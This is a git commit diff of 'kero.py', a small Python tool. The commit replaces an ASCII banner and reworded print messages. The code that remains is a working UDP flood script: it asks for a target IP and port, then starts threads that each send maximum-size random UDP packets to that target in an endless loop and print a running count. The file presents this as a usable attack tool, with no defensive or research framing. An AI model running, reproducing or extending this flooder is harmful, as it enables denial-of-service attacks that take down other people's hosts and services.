9d62389bd46fe73286670a85b16c3889081c6cae
kero <152279857+1sudoxyz@users.noreply.github.com>
2023-12-12 15:38:44 +0400

    Update kero.py
    new banner, changed prints a lil

--- kero.py
+++ kero.py
@@ -3,21 +3,21 @@ import threading
 import random
 import sys
 
-def machine(ip, port, size, i): #machine
+def machine(ip, port, size, i):
     zzz = 0
     srvr = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
-        srvr.sendto(random._urandom(size), (ip, port)) #sends packets ig
+        srvr.sendto(random._urandom(size), (ip, port))
         zzz += 1
         print(f"CONNECTIONS: {zzz} | TARGET: {ip}:{port}")
 
 def main():
     try:
-        if len(sys.argv) < 5: #banner so good
+        if len(sys.argv) < 5:
             print('''
-        █▄▀ █▀▀ █▀█ █▀█
-        █░█ ██▄ █▀▄ █▄█
-           ver 0.2\n''')
+    █▀█ █▀▄ ▄▀█ █▄█
+    █▄█ █▄▀ █▀█ ░█░
+        ver 0.3\n''')
 
         ip = input("IP: ")
         port = int(input("Port: "))
@@ -25,19 +25,19 @@ def main():
         size = int(65500)
 
     except KeyboardInterrupt:
-        print("INTERRUPT")
+        print("Interrupt")
         sys.exit()
 
     except Exception as e:
-        print(f"\n<<ERROR>> {e}")
+        print(f"Error: {e}")
         sys.exit()
 
     for i in range(threads):
         try:
-            t = threading.Thread(target=machine, args=(ip, port, size, i)) #threading kool
+            t = threading.Thread(target=machine, args=(ip, port, size, i))
             t.start()
         except Exception as e:
-            print(f"\n<<ERROR>> {i}: {e}")
+            print(f"Error: {i}: {e}")
 
 if __name__ == "__main__":
     main()
